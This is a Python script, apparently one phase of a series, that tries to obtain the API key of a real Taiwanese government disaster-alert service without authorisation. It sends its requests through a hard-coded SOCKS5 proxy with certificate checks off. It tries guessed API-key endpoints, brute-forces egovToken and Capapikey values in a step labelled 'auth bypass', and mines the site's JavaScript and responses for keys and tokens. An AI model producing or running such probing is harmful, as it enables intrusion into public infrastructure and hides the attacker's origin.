#!/usr/bin/env python3
"""Phase 51: Get actual API key via website auth flow + egovToken."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, json, re, base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {'https': 'socks5h://202.160.76.154:11085', 'http': 'socks5h://202.160.76.154:11085'}
BASE_SITE = 'https://alerts.ncdr.nat.gov.tw'
BASE_API = 'https://alerts.ncdr.nat.gov.tw/AddValueApi'

print("=== NCDR API Key Retrieval ===")

# 1. Try to get API key directly via the website's own API
print("\n1. Try direct API key retrieval:")
for path in ['/v1/Alerts/Values/apikey', '/Alerts/Values/apikey']:
    for method in ['GET', 'POST']:
        try:
            if method == 'GET':
                r = requests.get(f'{BASE_SITE}{path}', proxies=PROXY, verify=False, timeout=15,
                                headers={'User-Agent': 'Mozilla/5.0', 'Capapikey': 'test'})
            else:
                r = requests.post(f'{BASE_SITE}{path}', proxies=PROXY, verify=False, timeout=15,
                                json={}, headers={'User-Agent': 'Mozilla/5.0', 'Capapikey': 'test'})
            print(f"  {method} {path} -> {r.status_code}, len={len(r.text)}")
            if r.status_code == 200:
                print(f"    Body: {r.text[:500]}")
        except Exception as e:
            print(f"  {method} {path} -> ERR")

# 2. The app.js uses `window.postApi` which means there's a custom API function. 
# Let's look for the window.postApi definition
print("\n2. Search for postApi and API base URL in app.js:")
with open('/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/ncdr_app__web_static_js_app_17b2ff38_js.js', 'r', errors='replace') as f:
    content = f.read()

# Find the API base configuration
api_configs = re.findall(r'(?:apiUrl|baseUrl|apiBase|baseURL)\s*[:=]\s*["\']([^"\']+)["\']', content)
if api_configs:
    print(f"  API base URLs: {api_configs}")

# Find the postApi function
post_api = re.findall(r'postApi\s*[:=]\s*(?:async\s*)?\s*\(\s*([^,]+),\s*([^)]+)\)\s*=>', content)
if post_api:
    print(f"  postApi function found")
    # Show the surrounding context
    idx = content.find('postApi')
    if idx > 0:
        print(f"  Context: {content[idx:idx+300]}")

# Find how headers are set for API calls
header_sets = re.findall(r'headers\s*:\s*\{[^}]*(?:Capapikey|apiKey|Authorization)[^}]*\}', content, re.I | re.DOTALL)
for h in header_sets[:3]:
    print(f"  Header setup: {h[:200]}")

# Find the eGovProfile URL
egov_profile = re.findall(r'eGovProfile\s*[:=]\s*["\']([^"\']+)["\']', content)
if egov_profile:
    print(f"  eGovProfile URLs: {egov_profile}")

# 3. The key insight: the website itself calls getAddValueApiKey to get its API key
# This means we need to authenticate first. Let's try the egovToken flow.
print("\n3. Try egovToken flow:")

# The egovToken is obtained from somewhere - let's search for how it's set
egov_token_usage = re.findall(r'egovToken', content)
print(f"  egovToken references: {len(egov_token_usage)}")

# Find context around egovToken
egov_ctxs = re.findall(r'.{0,150}egovToken.{0,150}', content)
for ctx in egov_ctxs[:5]:
    print(f"  Context: ...{ctx}...")

# 4. Try to access the website with egovToken parameter
print("\n4. Visit website with egovToken parameter:")
for token in ['test', 'demo', 'admin', 'public']:
    try:
        r = requests.get(f'{BASE_SITE}/?egovToken={token}', proxies=PROXY, verify=False, timeout=15,
                        headers={'User-Agent': 'Mozilla/5.0'})
        print(f"  egovToken={token} -> {r.status_code}, len={len(r.text)}")
        
        # Check if the page loads differently
        if r.status_code == 200:
            # Look for API key in the page
            api_keys = re.findall(r'(?:Capapikey|API[_-]?Key|apiKey)["\s:=]+["\']?([A-Za-z0-9_\-]{10,})', r.text, re.I)
            if api_keys:
                print(f"    Found API key: {api_keys}")
            # Look for any session/token in the page
            tokens = re.findall(r'(?:token|Token)["\s:=]+["\']([A-Za-z0-9_\-]+)', r.text)
            if tokens:
                print(f"    Found tokens: {tokens[:5]}", )
    except Exception as e:
        print(f"  egovToken={token} -> ERR")

# 5. Try the AddValueApi endpoints with auth bypass
print("\n5. Try AddValueApi with various auth combos:")
for key in ['test', 'NCDR', 'AddValue', 'admin']:
    # Try getting event codes (should work if auth bypassed)
    try:
        r = requests.get(f'{BASE_API}/EventCode', proxies=PROXY, verify=False, timeout=15,
                        headers={'User-Agent': 'Mozilla/5.0', 'Capapikey': key, 'Accept': 'application/json'})
        print(f"  Capapikey={key} /EventCode -> {r.status_code} - {r.text[:100]}")
    except:
        pass

# 6. Also try to get a token from the website's login
print("\n6. Try website login:")
session = requests.Session()
session.proxies = PROXY
session.verify = False
session.headers.update({'User-Agent': 'Mozilla/5.0'})

# First visit the website
r = session.get(BASE_SITE)
print(f"  Visit website -> {r.status_code}")

# Check for any API calls the website makes on load
# The website uses egovToken from URL parameter
# Let's see if there's a way to get a token

# Try visiting with different eGovProfile-like endpoints
for path in ['/eGovProfile', '/api/eGovProfile', '/v1/eGovProfile', '/auth/eGovProfile']:
    try:
        r = session.get(f'{BASE_SITE}{path}', timeout=15)
        if r.status_code != 404:
            print(f"  GET {path} -> {r.status_code}, len={len(r.text)}")
            if r.status_code == 200:
                print(f"    Body: {r.text[:200]}")
    except:
        pass

print("\nDone.")
